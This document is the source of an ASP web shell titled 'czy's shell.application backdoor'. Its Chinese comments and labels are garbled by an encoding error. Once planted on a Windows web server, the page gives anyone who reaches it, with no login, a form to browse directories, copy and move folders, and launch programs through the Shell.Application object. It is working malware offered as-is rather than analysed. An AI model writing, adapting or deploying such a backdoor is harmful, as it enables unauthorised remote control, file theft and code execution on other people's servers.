   <%response.write "<font size=6 color=red>Ò»´ÎÖ»ÄÜÖ´ÐÐÒ»¸ö²Ù×÷:)</font>" %>
   <%response.write now()%><BR>³ÌÐòËùÔÚµÄÎïÀíÂ·¾¶£º
   <%response.write request.servervariables("APPL_PHYSICAL_PATH")%>
   <html>
   <title>czy's shell.application backdoor </title>
   <body>
   <form action="<%= Request.ServerVariables("URL") %>" method="POST">
   <input type=text name=text value="<%= szCMD %>"> ÊäÈëÒªä¯ÀÀµÄÄ¿Â¼<br>
   <input type=text name=text1 value="<%= szCMD1 %>">
   copy
   <input type=text name=text2 value="<%= szCMD2 %>"><br>
   <input type=text name=text3 value="<%= szCMD3 %>">
   move
   <input type=text name=text4 value="<%= szCMD4 %>"><br>
   Â·¾¶£º<input type=text name=text5 value="<%= szCMD5 %>">
   ³ÌÐò£º<input type=text name=text6 value="<%= szCMD6 %>"><br>
   <input type=submit name=sb value=·¢ËÍÃüÁî>
   </form>
   </body>
   </html>
   <%
   szCMD = Request.Form("text") 'Ä¿Â¼ä¯ÀÀ
   if (szCMD <> "") then
   set shell=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell.namespace(szcmd)
   set foditems=fod1.items
   for each co in foditems
   response.write "<font color=red>" & co.path & "-----" & co.size & "</font><br>"
   next
   end if
   %>

   <%
   szCMD1 = Request.Form("text1") 'Ä¿Â¼¿½±´£¬²»ÄÜ½øÐÐÎÄ¼þ¿½±´
   szCMD2 = Request.Form("text2")
   if szcmd1<>"" and szcmd2<>"" then
   set shell1=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell1.namespace(szcmd2)

   for i=len(szcmd1) to 1 step -1
   if mid(szcmd1,i,1)="\" then
   path=left(szcmd1,i-1)
   exit for
   end if
   next

   if len(path)=2 then path=path & "\"
   path2=right(szcmd1,len(szcmd1)-i)
   set fod2=shell1.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.copyhere foditem
   response.write "command completed success!"
   end if
   %>

   <%
   szCMD3 = Request.Form("text3") 'Ä¿Â¼ÒÆ¶¯
   szCMD4 = Request.Form("text4")
   if szcmd3<>"" and szcmd4<>"" then
   set shell2=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell2.namespace(szcmd4)

   for i=len(szcmd3) to 1 step -1
   if mid(szcmd3,i,1)="\" then
   path=left(szcmd3,i-1)
   exit for
   end if
   next

   if len(path)=2 then path=path & "\"
   path2=right(szcmd3,len(szcmd3)-i)
   set fod2=shell2.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.movehere foditem
   response.write "command completed success!"
   end if
   %>
   <%
   szCMD5 = Request.Form("text5") 'Ö´ÐÐ³ÌÐòÒªÖ¸¶¨Â·¾¶
   szCMD6 = Request.Form("text6")
   if szcmd5<>"" and szcmd6<>"" then
   set shell3=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   shell3.namespace(szcmd5).items.item(szcmd6).invokeverb
   response.write "command completed success!"
   end if

   %>
